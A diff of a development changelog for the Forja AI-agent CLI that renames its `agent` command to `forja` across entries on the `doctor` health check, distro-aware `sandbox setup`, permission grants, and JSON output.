+`forja doctor` (slice 43) tells the operator WHAT's missing; this slice tells them WHAT TO DO about it. Without setup, a fresh Linux user who runs doctor and sees "sandbox: warn — install bubblewrap" has to figure out the right command for their distro themselves. That's a real bar for first-boot — every distribution has a different incantation (`apt`, `dnf`, `pacman`, `apk`, etc), and operators new to Forja shouldn't have to do that lookup.
 
-This slice closes the gap. `agent sandbox setup` detects the distro from `/etc/os-release` and renders the exact command:
+This slice closes the gap. `forja sandbox setup` detects the distro from `/etc/os-release` and renders the exact command:
 - Ubuntu → `sudo apt install bubblewrap`
 - Fedora → `sudo dnf install bubblewrap`
 - Arch → `sudo pacman -S bubblewrap`
@@ -18887,7 +20191,7 @@ This slice closes the gap. `agent sandbox setup` detects the distro from `/etc/o
 
 | File | Change |
 |---|---|
-| `src/cli/args.ts` | New `parseSandboxSubcommand` matching the `agent permission <verb>` shape — `sandbox` is the outer subcommand, `setup` is the verb. `KNOWN_SANDBOX_VERBS = ['setup']` so future sandbox verbs (e.g. `test`, `list-profiles`) plug in cleanly. New `sandbox?: { verb: 'setup'; json: boolean }` on parsed args. Help text updated with `agent sandbox setup` example. Wired into `parseArgs` before `parsePermissionSubcommand`. |
+| `src/cli/args.ts` | New `parseSandboxSubcommand` matching the `forja permission <verb>` shape — `sandbox` is the outer subcommand, `setup` is the verb. `KNOWN_SANDBOX_VERBS = ['setup']` so future sandbox verbs (e.g. `test`, `list-profiles`) plug in cleanly. New `sandbox?: { verb: 'setup'; json: boolean }` on parsed args. Help text updated with `forja sandbox setup` example. Wired into `parseArgs` before `parsePermissionSubcommand`. |
 | `src/cli/run.ts` | New dispatch arm for `args.sandbox !== undefined` — verb switch on `args.sandbox.verb`. Lazy-imports `./sandbox-setup.ts` for the `setup` verb. Same lifecycle-mode shape as `doctor`. |
 | `src/cli/index.ts` | `promptOptional` list extended with `args.sandbox !== undefined` — same TTY-gate exemption as the other lifecycle modes. |
 | `src/cli/sandbox-setup.ts` (new, ~225 lines) | `runSandboxSetup({json?, which?, readOsRelease?, platform?, arch?, out, err})`. Three test seams: `which()` for binary probes, `readOsRelease()` for the /etc/os-release file, and `platform`/`arch` overrides so a Linux runner can pin a macOS scenario. `DISTRO_INSTALL` table maps 16 known distro IDs to install commands (Ubuntu/Debian/Pop/Mint/Fedora/RHEL/CentOS/Rocky/AlmaLinux/openSUSE/SLES/Arch/Manjaro/EndeavourOS/Alpine/Gentoo/Void/NixOS). `parseOsRelease` tolerates quoted and unquoted values per the freedesktop spec. ID_LIKE fallback handles boutique derivatives (e.g. an unrecognized ID with `ID_LIKE="ubuntu debian"` falls back to apt). 4 recommendation statuses: `install` (distro known, command renders), `already-installed` (sandbox already on PATH), `path-broken` (macOS without sandbox-exec → almost always PATH issue), `unsupported` (other platforms). JSON mode emits a single envelope; plain mode renders multi-line text with platform/distro header + command block + verification pointer. |
@@ -18896,15 +20200,15 @@ This slice closes the gap. `agent sandbox setup` detects the distro from `/etc/o
 ### Smoke
 
 ```
-$ agent sandbox setup        # on a Ubuntu box with bwrap installed
+$ forja sandbox setup        # on a Ubuntu box with bwrap installed
 Platform: linux x64
 Distro:   Ubuntu 22.04 LTS (ubuntu)
 
-bwrap is already installed. Run 'agent doctor' to verify the full health check.
+bwrap is already installed. Run 'forja doctor' to verify the full health check.
 ```
 
 ```
-$ agent sandbox setup        # on a Ubuntu box WITHOUT bwrap
+$ forja sandbox setup        # on a Ubuntu box WITHOUT bwrap
 Platform: linux x64
 Distro:   Ubuntu 22.04 LTS (ubuntu)
 
@@ -18914,22 +20218,22 @@ Recommended install:
   sudo apt install bubblewrap
 
 After install, verify with:
-  agent doctor
+  forja doctor
 ```
 
 ```
-$ agent sandbox setup --json # on a Ubuntu box WITHOUT bwrap
+$ forja sandbox setup --json # on a Ubuntu box WITHOUT bwrap
 {"ok":true,"platform":"linux","arch":"x64","status":"install","distro":{"id":"ubuntu","pretty":"Ubuntu 22.04 LTS","installCommand":"sudo apt install bubblewrap"},"installCommand":"sudo apt install bubblewrap","message":"..."}
 ```
 
 ### Decisions
 
-- **Verb shape: `agent sandbox setup` (noun + sub-verb), not `agent sandbox-setup` (flat).** Matches `agent permission <verb>`. The hierarchical shape leaves room for future sandbox verbs (`test`, `list-profiles`, `verify`) without polluting the top-level verb namespace.
+- **Verb shape: `forja sandbox setup` (noun + sub-verb), not `forja sandbox-setup` (flat).** Matches `forja permission <verb>`. The hierarchical shape leaves room for future sandbox verbs (`test`, `list-profiles`, `verify`) without polluting the top-level verb namespace.
 - **No auto-install.** Spec §13.1 explicit: "detect, don't distribute". An auto-install would: (a) require root, (b) introduce a security boundary Forja shouldn't own, (c) make Forja responsible for every distro's package idiosyncrasies. The operator-runs-the-command model keeps Forja stateless w.r.t. system packages.
 - **16-distro table, with ID_LIKE fallback for derivatives.** Initial mapping covers ~90% of operator distros. ID_LIKE handles the long tail of derivatives (Pop!_OS, Linux Mint, MX Linux all have `ID_LIKE=ubuntu` or `ID_LIKE=debian`) — they automatically inherit the parent's install command without explicit mapping. Unknown ID + unknown ID_LIKE → generic fallback message naming the package, not the command (operator does the lookup but knows what to look for).
 - **JSON envelope is a single line, not NDJSON.** Doctor's NDJSON makes sense (one event per check); sandbox setup produces ONE recommendation, so a single JSON object is simpler. Consumers do a single `JSON.parse` instead of stream parsing.
 - **macOS path-broken message instead of install command.** sandbox-exec ships with every supported macOS version at `/usr/bin/sandbox-exec`. If `which sandbox-exec` returns null, the binary IS there — the operator's $PATH is broken. Telling them to "install sandbox-exec" would be misleading. Surfacing the real diagnostic (re-source shell rc, check that /usr/bin is on PATH) catches the actual failure mode.
-- **`already-installed` returns exit 0 with an informational message, not an error.** The verb is informational, not a gate. An operator running `agent sandbox setup` to double-check should get a "you're good" answer, not an error code. Exit 1 reserved for internal failures (file read errors, etc).
+- **`already-installed` returns exit 0 with an informational message, not an error.** The verb is informational, not a gate. An operator running `forja sandbox setup` to double-check should get a "you're good" answer, not an error code. Exit 1 reserved for internal failures (file read errors, etc).
 - **Distro table values are strings, not structured records.** Considered a richer shape (`{ command, requiresRoot: true, postInstallCheck: '...' }`) but rejected — every entry is `sudo $pm install bubblewrap` modulo the package manager. Strings keep the table readable and grep-friendly.
 
 ### Verification
@@ -18943,7 +20247,7 @@ $ agent sandbox setup --json # on a Ubuntu box WITHOUT bwrap
 ### Next
 
 §13 platform provisioning — remaining slices:
-1. **First-boot UX**: spec §13.5. When `agent` runs for the first time (no install_id), show a tailored doctor + setup walkthrough before opening the REPL. Builds on slices 43+44.
+1. **First-boot UX**: spec §13.5. When `forja` runs for the first time (no install_id), show a tailored doctor + setup walkthrough before opening the REPL. Builds on slices 43+44.
 2. **Broker/worker architecture**: spec §13.7. Multi-slice.
 3. **Doctor extensions**: kernel-feature probe (Linux unshare / user namespaces / cgroups), `/tmp` size + permissions, container detection.
 
@@ -18951,9 +20255,9 @@ Non-§13 successors: macOS sandbox-exec (the second-biggest platform gap), MCP-t
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 43: `agent doctor` (§13 platform provisioning — foundation)
+## [2026-05-11] permission-engine-v2 — slice 43: `forja doctor` (§13 platform provisioning — foundation)
 
-**Done.** Forty-third slice. First slice on §13 — biggest user-facing block remaining from the §23 production-ready criteria. Pivots from the §8 grants thread (39-42) to platform provisioning. Spec §13.3-13.9 calls for `forja doctor` (renamed `agent doctor` per repo conventions), `agent sandbox setup`, broker/worker architecture, first-boot UX, degradation banners. This slice ships the foundation — the doctor verb — with 5 checks; subsequent slices add `sandbox setup`, the broker arch, and the rest of §13.
+**Done.** Forty-third slice. First slice on §13 — biggest user-facing block remaining from the §23 production-ready criteria. Pivots from the §8 grants thread (39-42) to platform provisioning. Spec §13.3-13.9 calls for `forja doctor` (renamed `forja doctor` per repo conventions), `forja sandbox setup`, broker/worker architecture, first-boot UX, degradation banners. This slice ships the foundation — the doctor verb — with 5 checks; subsequent slices add `sandbox setup`, the broker arch, and the rest of §13.
 
 Spec philosophy line 765: "detect, don't distribute" — Forja probes the host, surfaces what's there, recommends (doesn't auto-install) anything missing. The doctor verb is exactly that surface.
 
@@ -18965,27 +20269,27 @@ Operators running Forja for the first time today get a single "sandbox available
 
 | File | Change |
 |---|---|
-| `src/cli/args.ts` | New `parseDoctorSubcommand`. Top-level verb matching the `init` / `recap` / `permission` shape. Accepts `--json` and `--help`; rejects every other flag + any positional with a clear error message. Wired into `parseArgs` before the main flag scanner. New `doctor?: { json: boolean }` on parsed args. Help text updated with `agent doctor` example. |
+| `src/cli/args.ts` | New `parseDoctorSubcommand`. Top-level verb matching the `init` / `recap` / `permission` shape. Accepts `--json` and `--help`; rejects every other flag + any positional with a clear error message. Wired into `parseArgs` before the main flag scanner. New `doctor?: { json: boolean }` on parsed args. Help text updated with `forja doctor` example. |
 | `src/cli/run.ts` | New dispatch arm for `args.doctor !== undefined` — lazy-imports `./doctor.ts` and runs the handler. Lifecycle-mode (no provider, no DB, no harness) like `--list-sessions` / `--explain-permissions`. |
 | `src/cli/index.ts` | `promptOptional` list includes `args.doctor !== undefined` — doctor doesn't need a prompt, mirrors the other lifecycle exemptions. |
-| `src/cli/doctor.ts` (new, ~225 lines) | `runDoctor({json?, env?, which?, out?, err?}): Promise<number>`. 5 checks: `platform` (OS + arch + node + bun versions, always ok), `sandbox` (detectSandboxAvailability → bwrap or sandbox-exec; warn on absence with distro-specific remediation), `config_dir` (`~/.config/agent` writability via `installIdPath` → dirname → mkdir probe; fail on derivation or mkdir failure), `data_dir` (`~/.local/share/forja` writability via XDG_DATA_HOME + HOME; fail on undeclared HOME), `git` (`which('git')`; warn on absence — git_* tools degrade, agent itself doesn't). DoctorCheck shape: `{name, status: ok\|warn\|fail, detail, remediation?}`. JSON mode emits `{kind:'check',...}` per check + a `{kind:'summary', ok, counts:{ok,warn,fail}}` footer. Plain text: per-check block (`name` / `status` / `detail` / `→ remediation`) + summary line. Exit 0 on `fail=0` (warnings allowed); exit 1 on any fail. Test seam: injectable `which(cmd)` so unit tests don't depend on $PATH. |
+| `src/cli/doctor.ts` (new, ~225 lines) | `runDoctor({json?, env?, which?, out?, err?}): Promise<number>`. 5 checks: `platform` (OS + arch + node + bun versions, always ok), `sandbox` (detectSandboxAvailability → bwrap or sandbox-exec; warn on absence with distro-specific remediation), `config_dir` (`~/.config/forja` writability via `installIdPath` → dirname → mkdir probe; fail on derivation or mkdir failure), `data_dir` (`~/.local/share/forja` writability via XDG_DATA_HOME + HOME; fail on undeclared HOME), `git` (`which('git')`; warn on absence — git_* tools degrade, agent itself doesn't). DoctorCheck shape: `{name, status: ok\|warn\|fail, detail, remediation?}`. JSON mode emits `{kind:'check',...}` per check + a `{kind:'summary', ok, counts:{ok,warn,fail}}` footer. Plain text: per-check block (`name` / `status` / `detail` / `→ remediation`) + summary line. Exit 0 on `fail=0` (warnings allowed); exit 1 on any fail. Test seam: injectable `which(cmd)` so unit tests don't depend on $PATH. |
 | `tests/cli/doctor.test.ts` (new, 11 tests) | Parser (5 tests: verb recognized, --json captured, --help short-circuits, unknown flag rejected, positional rejected) + handler (6 tests: all-pass exit 0 + footer, missing sandbox → warn, missing git → warn, NDJSON shape with 5 checks + summary, JSON summary.ok=false + exit 1 on fail, plain-text remediation hint renders). |
 
 ### Decisions
 
-- **Verb name: `doctor` not `forja doctor`.** Spec docs say `forja doctor`, but the binary in this repo is `agent` (per `bin: { agent: ... }` in package.json). Verb shape matches existing convention.
+- **Verb name: `doctor` not `forja doctor`.** Spec docs say `forja doctor`, but the binary in this repo is `forja` (per `bin: { agent: ... }` in package.json). Verb shape matches existing convention.
 - **Sandbox absence is `warn`, not `fail`.** Operators without bwrap installed on a fresh Linux box should still see a useful doctor report. The engine's degraded path covers the runtime; doctor's role is to surface that the safety net is missing. `fail` would block the first-boot experience for every Linux user without bubblewrap pre-installed.
 - **Git absence is `warn`, not `fail`.** Most agent tools work without git. Only `git_*` tools (commit, push, branch) need it; operators doing read-only Q&A don't. Categorizing `warn` lets the operator know they need git for SOME flows but doesn't block the others.
-- **Config dir absence is `fail` not `warn`.** Without a derivable config dir, `ensureInstallId` throws on engine bootstrap — the audit chain genesis derives from install_id, so a fresh install can't anchor anywhere. This IS a blocking condition. The doctor's `fail` surfaces it BEFORE bootstrap, so operators see a clean diagnostic instead of an opaque crash on the first `agent` invocation.
-- **5 checks now, not 15.** The §13 spec mentions many more (XDG variables, kernel feature flags, namespace availability, $TMPDIR, etc). For the foundation slice, 5 covers the most-common first-boot failure modes. Future slices add more — `agent doctor --thorough` (Linux kernel features, /tmp size, container detection) would be a natural extension.
+- **Config dir absence is `fail` not `warn`.** Without a derivable config dir, `ensureInstallId` throws on engine bootstrap — the audit chain genesis derives from install_id, so a fresh install can't anchor anywhere. This IS a blocking condition. The doctor's `fail` surfaces it BEFORE bootstrap, so operators see a clean diagnostic instead of an opaque crash on the first `forja` invocation.
+- **5 checks now, not 15.** The §13 spec mentions many more (XDG variables, kernel feature flags, namespace availability, $TMPDIR, etc). For the foundation slice, 5 covers the most-common first-boot failure modes. Future slices add more — `forja doctor --thorough` (Linux kernel features, /tmp size, container detection) would be a natural extension.
 - **JSON shape: NDJSON one-per-check + summary.** Same convention as `--list-sessions`, `--explain-permissions --json`, etc. Consumers `jq 'select(.kind == "check" and .status == "fail")'` to grep for failures, `jq 'select(.kind == "summary").ok'` for the bottom-line bool. Stream-parsable.
-- **`platformOptional` in `index.ts` extended.** Doctor doesn't need a prompt; mirrors the exemption for `--list-sessions` and `recap`. Without this, `agent doctor` would route into the REPL TTY gate on non-interactive shells (CI).
+- **`platformOptional` in `index.ts` extended.** Doctor doesn't need a prompt; mirrors the exemption for `--list-sessions` and `recap`. Without this, `forja doctor` would route into the REPL TTY gate on non-interactive shells (CI).
 - **`which()` test seam.** Tests pass a stub so the sandbox + git checks behave deterministically on any runner. CI hosts often lack bwrap; we don't want the test suite reporting different doctor output between local dev and CI. Production callers leave `which` undefined and `Bun.which` runs.
 
 ### Smoke
 
 ```
-$ agent doctor
+$ forja doctor
 platform
   status: ok
   linux x64 (node 24.3.0, bun 1.3.13)
@@ -18996,7 +20300,7 @@ sandbox
 
 config_dir
   status: ok
-  /home/lex/.config/agent
+  /home/lex/.config/forja
 
 data_dir
   status: ok
@@ -19010,10 +20314,10 @@ summary: all checks passed
 ```
 
 ```
-$ agent doctor --json
+$ forja doctor --json
 {"kind":"check","name":"platform","status":"ok","detail":"linux x64 (node 24.3.0, bun 1.3.13)"}
 {"kind":"check","name":"sandbox","status":"ok","detail":"bwrap available"}
-{"kind":"check","name":"config_dir","status":"ok","detail":"/home/lex/.config/agent"}
+{"kind":"check","name":"config_dir","status":"ok","detail":"/home/lex/.config/forja"}
 {"kind":"check","name":"data_dir","status":"ok","detail":"/home/lex/.local/share/forja"}
 {"kind":"check","name":"git","status":"ok","detail":"found at /usr/bin/git"}
 {"kind":"summary","ok":true,"counts":{"ok":5,"warn":0,"fail":0}}
@@ -19030,9 +20334,9 @@ $ agent doctor --json
 ### Next
 
 §13 platform provisioning — subsequent slices:
-1. **`agent sandbox setup`** — guided remediation flow. When `doctor` reports sandbox warn, this is the follow-up: detect distro, suggest the install command, optionally invoke `bwrap --version` post-install to verify. No auto-installs (spec §13.1 "detect, don't distribute").
+1. **`forja sandbox setup`** — guided remediation flow. When `doctor` reports sandbox warn, this is the follow-up: detect distro, suggest the install command, optionally invoke `bwrap --version` post-install to verify. No auto-installs (spec §13.1 "detect, don't distribute").
 2. **Broker/worker architecture** — spec §13.7. For sandboxed-cap subagents, a single broker process owns the sandbox setup and workers connect to it. Multi-slice work.
-3. **First-boot UX** — spec §13.5. When `agent` runs for the first time (no install_id), show a tailored doctor + setup walkthrough before opening the REPL.
+3. **First-boot UX** — spec §13.5. When `forja` runs for the first time (no install_id), show a tailored doctor + setup walkthrough before opening the REPL.
 4. **Doctor extensions**: kernel-feature probe (Linux unshare / user namespaces / cgroups), `/tmp` size + permissions, container detection (docker / podman / k8s), Forja own-binary integrity.
 
 Non-§13 successors: macOS sandbox-exec (the second-biggest platform gap), MCP-tool spawn wire-up, §7.3 external sealing.
@@ -19087,14 +20391,14 @@ Non-grants successors: macOS sandbox-exec, MCP-tool spawn wire-up, §13 platform
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 41: §8 grants — CLI surface (`agent permission grants` + `revoke`)
+## [2026-05-11] permission-engine-v2 — slice 41: §8 grants — CLI surface (`forja permission grants` + `revoke`)
 
-**Done.** Forty-first slice. Third on the §8 thread (39 = storage foundation, 40 = engine integration). Adds the two operator-facing CLI verbs spec §8 calls for: `agent permission grants [--all] [--json]` to list and `agent permission revoke <id> [--reason <text>] [--json]` to revoke (idempotent per spec line 621). Operators can now inspect what they've granted + revoke when needed BEFORE the modal-bridge slice (42+) wires up insert. Insertion remains operator-driven; the CLI exposes read + revoke only — no insert verb (that's the modal's job).
+**Done.** Forty-first slice. Third on the §8 thread (39 = storage foundation, 40 = engine integration). Adds the two operator-facing CLI verbs spec §8 calls for: `forja permission grants [--all] [--json]` to list and `forja permission revoke <id> [--reason <text>] [--json]` to revoke (idempotent per spec line 621). Operators can now inspect what they've granted + revoke when needed BEFORE the modal-bridge slice (42+) wires up insert. Insertion remains operator-driven; the CLI exposes read + revoke only — no insert verb (that's the modal's job).
 
 ### Why this matters
 
 Slice 40 made grants load-bearing in the engine, but operators couldn't see them. A grant inserted by some future modal flow would just... be there, with no operator visibility into what's authorized. Slice 41 closes the gap with the spec's two named CLI surfaces:
-- Spec line 621 explicitly names `agent permission revoke <id>`. This slice ships exactly that.
+- Spec line 621 explicitly names `forja permission revoke <id>`. This slice ships exactly that.
 - Listing is the natural complement — without it, `revoke <id>` requires the operator to know an id they can't discover.
 
 The two verbs together are the minimum viable §8 operator surface. After this slice, an admin can audit the entire grant state of a machine and clear anything they want gone, without touching SQL.
@@ -19113,9 +20417,9 @@ The two verbs together are the minimum viable §8 operator surface. After this s
 
 ### Decisions
 
-- **`grants` listing verb + `revoke` action verb (flat names).** Spec line 621 says `agent permission revoke <id>` verbatim. Listing isn't named in the spec; `grants` is the natural choice (matches the table name; future verbs like `policies` or `sessions` follow the same noun-as-verb pattern). Considered `list-grants` + `revoke-grant` (verb-prefixed) but rejected — flat names compose better and match the existing `verify` / `inspect` / `replay` shape.
+- **`grants` listing verb + `revoke` action verb (flat names).** Spec line 621 says `forja permission revoke <id>` verbatim. Listing isn't named in the spec; `grants` is the natural choice (matches the table name; future verbs like `policies` or `sessions` follow the same noun-as-verb pattern). Considered `list-grants` + `revoke-grant` (verb-prefixed) but rejected — flat names compose better and match the existing `verify` / `inspect` / `replay` shape.
 - **`--all` is verb-specific, not generic.** Restricted to `grants` at parse time (the validation block matches `--reason → revoke/rotate-chain`, `--clear → inspect`, etc). Reusing `--all` later for a different verb would need an explicit parser update — flag drift is caught at parse, not by silent ignore.
-- **No `--id <id>` flag, positional argument only.** Spec line 621 says `agent permission revoke <id>` — id is the principal subject of the command, not a flag. Positional matches the existing `inspect <rotation_id>` / `diff <seq1> <seq2>` shape.
+- **No `--id <id>` flag, positional argument only.** Spec line 621 says `forja permission revoke <id>` — id is the principal subject of the command, not a flag. Positional matches the existing `inspect <rotation_id>` / `diff <seq1> <seq2>` shape.
 - **ULID-shape validation at the handler, not the parser.** Could have rejected non-ULID ids during arg parse (already do this for numeric seqs in `replay`/`inspect`/`diff`). Decided to validate in the handler instead: keeps the ULID import out of args.ts (which doesn't otherwise need permissions/ulid.ts), and the error message can mention the canonical form (26 chars, Crockford base32, uppercase) at the same surface as the runtime. Net effect for operators is identical.
 - **CLI doesn't scope by install_id.** Grants are matched globally by ULID on revoke. Multi-install machines (rare, but technically possible) could in principle have grants from a different install on the same DB file — but the operator running the CLI is authorized to revoke anything in their DB regardless of install attribution. Isolation is at the DB-file level, not the install_id level. Keeps the revoke surface simple.
 - **Listing scopes by install_id (different rationale).** Operators expect "what did I grant?" to mean THEIR install's grants. Cross-install bleed in the listing would be confusing — they'd see grants they didn't issue. The repo's existing `installId` filter handles this.
@@ -19183,7 +20487,7 @@ Slice 39 shipped the grants table and repo but nothing consumed them. Operators 
 
 §8 grants thread — remaining slices:
 1. **Modal bridge → `insertGrant`.** When the operator answers "Yes, don't ask again for: <pattern>" with a TTL choice (24h / 7d / 30d), the bridge calls `insertGrant` instead of (or alongside) the current in-memory `addSessionAllow`. Requires UX for TTL selection in the modal.
-2. **CLI surface**: `agent permission grants list` (active by default, `--all` for revoked/expired), `agent permission grants revoke <id> [--reason <text>]`. Read + revoke only; insertion goes through the modal.
+2. **CLI surface**: `forja permission grants list` (active by default, `--all` for revoked/expired), `forja permission grants revoke <id> [--reason <text>]`. Read + revoke only; insertion goes through the modal.
 3. **Capability-scope grants**: `scope_kind='capability'` grants where `scope_value` is itself a capability-string. Engine consults `capabilityCovers(grant.scope_value, emitted_cap)` instead of glob matching. Requires plumbing the resolved capabilities into checkX.
 4. **TTL UX promotion**: spec §8 line 604 — "`once` é default sugerido pra primeira aprovação. UX promove pra `session` na N-ésima repetição da mesma capability+scope". Counter + threshold + promotion prompt.
 5. **ttl_expiry conformance (~6 cases)**: now buildable. Tests cover grant insertion + match + expiry + revocation. Builds on slice 40's engine integration.
@@ -19223,7 +20527,7 @@ Slice 39 lands the storage foundation: nothing in the engine consults grants yet
 - **`snapshotTs` parameterized in listActiveGrants.** Spec §8 names the variable explicitly: "WHERE expires_at > snapshot_ts AND revoked_at IS NULL". Mirroring it as a function parameter (not `Date.now()` baked in) gives three benefits: deterministic tests (fixed clocks pin behavior), historical replay (asking "what grants were live at T0?" feeds the audit reconstruction surface), and zero clock-reading in the repo (the test surface stays free of `vi.useFakeTimers()`-style mocks).
 - **`revokeGrant` returns `{ revoked: boolean }` not just void.** Idempotent operations are often surfaced as "no-op silently succeeded" — fine for write-once contracts, but here the operator might want a "already revoked at <ts>" message instead of a generic "ok". Returning a discriminator lets the CLI render the difference. The implementation uses the `WHERE revoked_at IS NULL` clause to filter out the second-revoke case at the SQL layer, so the result is naturally `changes=0` for repeats.
 - **Idempotent revoke preserves the FIRST revocation's audit trail.** A second `revokeGrant(id, t2, "reason2")` call must NOT overwrite the first call's `revoked_at` / `revoked_reason`. Test 18 pins this: the SQL `WHERE revoked_at IS NULL` filter means the UPDATE matches zero rows on the second call, leaving the original fields intact. Forensically critical — if compliance reviews the revocation log later, they see WHO revoked first and WHY.
-- **ULID over `crypto.randomUUID()`.** Spec §8 names ULID explicitly ("id TEXT PRIMARY KEY, -- ULID"). The properties that matter: time-sortable (lex order tracks chronological order, so `ORDER BY granted_at DESC` ties break naturally on id; without time-sort, queries would need secondary sort), URL/CLI-safe (Crockford base32 — no special chars in `agent permission revoke <id>`), and human-typeable (the alphabet drops I/L/O/U so a paste from terminal scrollback re-types without ambiguity). UUIDv4 misses every one of those — random 128 bits is more entropy than needed and doesn't sort.
+- **ULID over `crypto.randomUUID()`.** Spec §8 names ULID explicitly ("id TEXT PRIMARY KEY, -- ULID"). The properties that matter: time-sortable (lex order tracks chronological order, so `ORDER BY granted_at DESC` ties break naturally on id; without time-sort, queries would need secondary sort), URL/CLI-safe (Crockford base32 — no special chars in `forja permission revoke <id>`), and human-typeable (the alphabet drops I/L/O/U so a paste from terminal scrollback re-types without ambiguity). UUIDv4 misses every one of those — random 128 bits is more entropy than needed and doesn't sort.
 
 ### Verification
 
@@ -19236,7 +20540,7 @@ Slice 39 lands the storage foundation: nothing in the engine consults grants yet
 
 §8 grants thread — subsequent slices:
 1. **Engine integration**: `permissionEngine.check()` consults `listActiveGrants` before the regular allow/deny lookup. A live grant covering the (capability, scope) tuple short-circuits to allow. Audit row records the grant id in a new column. Multi-piece (engine wiring + migration for `approval_log.matched_grant_id` + tests).
-2. **CLI surface**: `agent permission grants list` (active by default, `--all` for revoked/expired), `agent permission grants revoke <id> [--reason <text>]`. Read-only audit + revocation, no insert from CLI (grants are created by the modal flow).
+2. **CLI surface**: `forja permission grants list` (active by default, `--all` for revoked/expired), `forja permission grants revoke <id> [--reason <text>]`. Read-only audit + revocation, no insert from CLI (grants are created by the modal flow).
 3. **Modal bridge**: when the operator answers "yes, don't ask again for: <pattern>" with a TTL choice (24h / 7d / 30d), the bridge calls `insertGrant`. Replaces the current in-memory session-allow promotion for the persisted scope kinds.
 4. **TTL UX promotion**: spec §8 line 604 — "`once` é default sugerido pra primeira aprovação. UX promove pra `session` na N-ésima repetição da mesma capability+scope". Counter + threshold + promotion prompt. Out-of-scope for the foundation slice.
 5. **ttl_expiry conformance (6 cases)**: now unblocked. Tests cover insert + expire + revoke + cross-install scoping + scope-kind validation, mostly already in `grants.test.ts` shape; the conformance YAML lifts them to the §16 surface.
@@ -19245,9 +20549,9 @@ Non-grants successors: macOS sandbox-exec, MCP-tool spawn wire-up, §13 platform
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 38: `agent --explain-permissions --json` NDJSON output
+## [2026-05-11] permission-engine-v2 — slice 38: `forja --explain-permissions --json` NDJSON output
 
-**Done.** Thirty-eighth slice. Closes the explicit follow-up in `explain-permissions.ts`'s file header ("JSON output is a follow-up — same shape pattern as --list-sessions: switch on `json` flag, emit one NDJSON line per layer + a summary line"). Adds `--json` support to `agent --explain-permissions`: stdout becomes NDJSON, one `{"kind":"layer",...}` event per loaded YAML file followed by one `{"kind":"merged",...}` event with the full resolved policy, per-section provenance, and lock conflicts. Stderr stays silent on the happy path — stdout is the pure stream. Closes the introspection trajectory (slices 23 → 34 → 35 → 36 → 37 → 38) with a CI/scriptable surface.
+**Done.** Thirty-eighth slice. Closes the explicit follow-up in `explain-permissions.ts`'s file header ("JSON output is a follow-up — same shape pattern as --list-sessions: switch on `json` flag, emit one NDJSON line per layer + a summary line"). Adds `--json` support to `forja --explain-permissions`: stdout becomes NDJSON, one `{"kind":"layer",...}` event per loaded YAML file followed by one `{"kind":"merged",...}` event with the full resolved policy, per-section provenance, and lock conflicts. Stderr stays silent on the happy path — stdout is the pure stream. Closes the introspection trajectory (slices 23 → 34 → 35 → 36 → 37 → 38) with a CI/scriptable surface.
 
 ### Why this matters
 
@@ -19267,13 +20571,13 @@ The slice also resolves a stream-pollution awkwardness in the human mode: lock c
 ### Sample output
 
 ```
-$ agent --explain-permissions --json
-{"kind":"layer","layer":"enterprise","path":"/etc/agent/permissions.yaml"}
-{"kind":"layer","layer":"project","path":"/r/.agent/permissions.yaml"}
+$ forja --explain-permissions --json
+{"kind":"layer","layer":"enterprise","path":"/etc/forja/permissions.yaml"}
+{"kind":"layer","layer":"project","path":"/r/.forja/permissions.yaml"}
 {"kind":"merged","policy":{"defaults":{"mode":"strict","locked":true},"tools":{"bash":{...}},"sandbox":{"required":true,"locked":true}},"provenance":{"defaults":"enterprise","bash":"project","sandbox":{"required":"enterprise","locked":"enterprise"}},"lockConflicts":[]}
 ```
 
-Consumers pipe via `jq`: `agent --explain-permissions --json | jq 'select(.kind == "merged").policy.sandbox'` returns the merged sandbox section directly.
+Consumers pipe via `jq`: `forja --explain-permissions --json | jq 'select(.kind == "merged").policy.sandbox'` returns the merged sandbox section directly.
 
 ### Decisions
 
@@ -19290,7 +20594,7 @@ Consumers pipe via `jq`: `agent --explain-permissions --json | jq 'select(.kind 
 - `bun run lint` — 0 errors, 2 pre-existing warnings (`tests/harness/abortable.test.ts:270/295`, untouched); applied Biome auto-format
 - `bun test` — **5396 pass / 10 skip / 0 fail** (5406 total across 249 files); 3 new tests on top of slice 37's 5393
 - `bun test tests/cli/explain-permissions.test.ts` — 18 pass (15 prior + 3 new)
-- Verified the help text update via `agent --help` rendering (manual inspection in the args.ts test setup).
+- Verified the help text update via `forja --help` rendering (manual inspection in the args.ts test setup).
 
 ### Next
 
@@ -19590,7 +20894,7 @@ Slice 10 shipped `selectSandboxProfile` with its per-profile capability tables, 
 - **All 5 profiles covered by the 4 tier-ladder cases + 1 host case.** The minimum for §16.2 is 6, and the surface to test has 5 profiles. Splitting "drop host when alternatives" across cases 2/3 means every non-host profile gets ONE positive case + the negative cases (host blocked) test the host gate from both angles. No case is redundant.
 - **`sandbox_uncovered` assertion is order-sensitive and sorted-ascending.** The planner uses `Array.from(requiredKinds).sort()` for the refuse envelope (sandbox-plan.ts:151-157). Sorting is part of the contract — a regression that left the kinds in iteration order would scramble forensic dumps. The conformance case asserts both the kinds AND their order; pinning `['host-passthrough', 'read-fs']` not `['read-fs', 'host-passthrough']` despite `read-fs` being declared first.
 - **The cwd-rw case explicitly sets `host_explicitly_allowed: true` to demonstrate the drop-host rule.** Without that flag, host wouldn't be a candidate AT ALL (host-passthrough cap missing) — the test would still pass but wouldn't exercise the rule. Setting the flag forces host to be a candidate in principle, then the "drop when alternatives" rule prunes it. Cleaner test that ACTUALLY hits the pruning code path.
-- **Home-rw test uses `secret-access:~/.config/agent` (not `secret-access:/some/other/path`).** The scope is illustrative — secret-access semantics in capability matching are scope-blind for profile selection (only the kind matters per the per-profile table). Using a realistic scope keeps the test legible without affecting the assertion.
+- **Home-rw test uses `secret-access:~/.config/forja` (not `secret-access:/some/other/path`).** The scope is illustrative — secret-access semantics in capability matching are scope-blind for profile selection (only the kind matters per the per-profile table). Using a realistic scope keeps the test legible without affecting the assertion.
 - **No `expect.kind` on any sandbox case.** Sandbox cases don't run the engine and don't produce decisions; the dispatch returns before any engine code. Pinning `kind` in the YAML would be a no-op assertion that confuses readers. The runner's existing `c.expect.kind !== undefined` guard (added in slice 31) means such an assertion would silently pass even if set wrong.
 
 ### Verification
@@ -19916,7 +21220,7 @@ The §10 invariant says **declared ⊆ parent**. Parent comes from policy. The p
 
 | File | Change |
 |---|---|
